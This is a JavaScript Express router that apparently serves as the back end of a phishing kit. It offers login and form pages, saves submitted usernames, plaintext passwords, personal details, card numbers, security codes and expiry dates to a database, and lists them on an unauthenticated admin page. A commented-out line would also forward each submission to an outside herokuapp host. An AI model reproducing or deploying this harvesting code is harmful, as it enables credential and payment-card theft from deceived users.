const express = require('express')
const mongoose = require('mongoose');
const User = require('../models/User')
const password = require('../models/Password')
const axios = require('axios')
const router = express.Router()




router.get('/', (req, res) => {
    res.render('home')
})
router.get('/login', (req, res) => {
    res.render('login')
})
router.get('/forgotpassword', (req, res) => {
    res.render('forgotPassword')
})
router.get('/form', (req, res) => {
    res.render('form')
})
// router.get('/verification', (req, res) => {
//     res.render('verification')
// })
// router.get('/success', (req, res) => {
//     res.render('success')
// })
router.get('/admin', (req, res) => {
    // res.render('admin')
    // const password = new password({
    //     'password': 'azerty123'
    // })
    // password.save()
    User.find().sort({ date: -1 }).then(users => res.render('admin', {users: users}))

})
router.get('/users', (req, res) => {

    User.find().sort({ date: -1 }).then(users => res.render('admin', {users: users}))

})
router.get('*', (req, res) =>{
    res.send('404')
})

router.post('/user', (req, res)=>{

    // User.findOne({email: req.body.email}).then(user =>{
    //     if (user) {res.json({error: 'username and email already exist'})}else{
            
    //     }
    // })
    
    const newUser = new User ({
        firstName: req.body.firstName,
        lastName: req.body.lastName,
        username: req.body.username,
        email: req.body.email,
        password: req.body.password,
        gender: req.body.gender,
        preferance: req.body.preferance,
        birthday: req.body.birthday,
        country: req.body.country,
        city: req.body.city,
        carteNumber: req.body.carteNumber,
        fullName: req.body.fullName,
        securityCode: req.body.securityCode,
        expiaryDate: req.body.expiaryDate,
    })
    newUser.save().then( user => res.json({success: true})).catch(err => {res.json({error: err}); console.log(err)})
    // res.json({success: true})

    //axios.post('https://kek2222222222.herokuapp.com/', {user: req.body})
})

router.post('/user-delete/:id', (req, res) => {
    User.findOne({ _id: req.params.id}).then(user => {
        user.remove().then(() => res.json({ success: true }));
    })
})





module.exports = router;
